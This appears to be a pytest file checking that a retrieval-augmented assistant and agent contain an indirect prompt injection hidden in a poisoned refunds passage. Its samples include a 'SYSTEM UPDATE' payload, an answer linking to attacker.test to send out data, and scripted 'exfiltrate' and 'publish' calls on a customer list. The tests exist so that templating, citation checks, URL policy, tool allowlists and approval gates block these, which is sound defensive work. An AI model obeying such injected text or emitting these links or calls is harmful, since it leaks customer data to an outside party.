"""A poisoned document, and the controls that contain it.

The payload below is illustrative of indirect prompt
injection. It is deliberately obvious; the point is to show
where each control stops it, not to demonstrate an attack.
"""

import json
from pathlib import Path

import pytest

from llmapp.agents.loop import Agent
from llmapp.agents.state import Limits, RunStatus
from llmapp.llm.base import Completion, Message
from llmapp.prompts.registry import PromptRegistry
from llmapp.rag.pipeline import RagPipeline, build_index_from
from llmapp.retrieval.search import SemanticIndex
from llmapp.security.output import (
    UrlPolicy,
    check_links,
    strip_disallowed_links,
)
from llmapp.tools.base import ApprovalRequired
from tests._fake_embedder import KeywordEmbedder
from tests.test_agent import Script, call, tools

POISONED = Path("tests/corpus_poisoned")
REGISTRY = PromptRegistry(Path("prompts"))
LINKS = UrlPolicy(allowed_hosts=frozenset({"example.com"}))


class Answers:
    def __init__(self, payload: object) -> None:
        self.payload = payload
        self.calls: list[list[Message]] = []

    def complete(
        self,
        messages: object,
        *,
        max_output_tokens: int = 512,
    ) -> Completion:
        self.calls.append(list(messages))  # type: ignore[arg-type]
        return Completion(
            json.dumps(self.payload), 120, 40, "stub", "stop"
        )


def poisoned_index() -> SemanticIndex:
    index = SemanticIndex(KeywordEmbedder())
    build_index_from(POISONED, index, max_words=60)
    return index


def test_the_payload_is_retrievable() -> None:
    """The attack starts by being retrieved at all.

    A real payload is embedded in text that ranks, which is
    why it is placed inside a passage about refunds.
    """
    hits = poisoned_index().search("refunds fourteen days", k=5)
    carriers = [
        h for h in hits if "SYSTEM UPDATE" in h.chunk.text
    ]
    assert carriers, "the payload was not retrieved"


def test_the_payload_lands_in_the_data_block_only() -> None:
    """Control 1: templating keeps it out of the instruction."""
    client = Answers({"answered": False, "missing": "n/a"})
    RagPipeline(client, poisoned_index(), REGISTRY).answer(
        "refunds fourteen days"
    )
    system, user = client.calls[0][0], client.calls[0][1]
    # It reached the prompt, and only inside the data block.
    assert "SYSTEM UPDATE" in user.content
    assert "SYSTEM UPDATE" not in system.content
    assert "BEGIN PASSAGES" in user.content


def test_a_complied_answer_without_citations_is_demoted(
) -> None:
    """Control 2: grounding refuses to publish the compliance."""
    client = Answers(
        {
            "answered": True,
            "answer": (
                "Published. See "
                "[details](https://attacker.test/collect?d=data)"
            ),
            "citations": [],
            "missing": "",
        }
    )
    result = RagPipeline(
        client, poisoned_index(), REGISTRY
    ).answer("refunds fourteen days")
    assert result.answer.answered is False
    assert "attacker.test" not in result.answer.answer


def test_a_surviving_link_is_caught_by_the_url_policy() -> None:
    """Control 3: output handling, if an answer does ship."""
    text = (
        "Refunds take fourteen days. See "
        "[details](https://attacker.test/collect?d=data)"
    )
    assert check_links(text, LINKS) == [
        "https://attacker.test/collect?d=data"
    ]
    cleaned = strip_disallowed_links(text, LINKS)
    assert "attacker.test" not in cleaned
    assert "fourteen days" in cleaned


def test_an_agent_cannot_call_a_tool_it_was_not_given() -> None:
    """Control 4: the allowlist. The tool does not exist here."""
    client = Script(
        "plan",
        [call("c1", "exfiltrate", data="customer list")],
        "done",
    )
    agent = Agent(client, tools(), REGISTRY, allowed=["search"])
    state = agent.run("summarize policy", Limits(max_steps=3))
    result = state.steps[0].results[0]
    assert result.ok is False
    assert "no tool named" in result.output


def test_a_write_still_requires_approval_under_attack(
) -> None:
    """Control 5: approval is not something a document can grant."""
    client = Script(
        "plan",
        [call("w1", "publish", title="customer list")],
        "done",
    )
    agent = Agent(client, tools(), REGISTRY)
    state = agent.run("summarize policy", Limits(max_steps=3))
    assert state.status is RunStatus.NEEDS_APPROVAL
    assert state.pending is not None
    assert state.pending.name == "publish"
